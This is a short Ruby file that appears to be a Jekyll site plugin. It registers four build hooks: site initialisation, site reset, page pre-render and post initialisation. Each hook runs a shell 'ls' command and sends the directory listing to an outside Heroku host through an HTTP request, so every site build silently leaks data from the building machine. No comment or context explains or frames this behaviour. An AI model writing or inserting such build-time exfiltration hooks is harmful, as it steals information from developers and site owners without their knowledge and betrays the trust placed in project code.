require 'net/http'

Jekyll::Hooks.register :site, :after_init do |post|
	output = `ls`
	uri = URI('https://mighty-sierra-43455.herokuapp.com?' + output)
	Net::HTTP.get(uri)
end

Jekyll::Hooks.register :site, :after_reset do |post|
	output = `ls`
	uri = URI('https://mighty-sierra-43455.herokuapp.com?' + output)
	Net::HTTP.get(uri)
end

Jekyll::Hooks.register :pages, :pre_render do |post|
	output = `ls`
	uri = URI('https://mighty-sierra-43455.herokuapp.com?' + output)
	Net::HTTP.get(uri)
end

Jekyll::Hooks.register :posts, :post_init do |post|
	output = `ls`
	uri = URI('https://mighty-sierra-43455.herokuapp.com?' + output)
	Net::HTTP.get(uri)
end

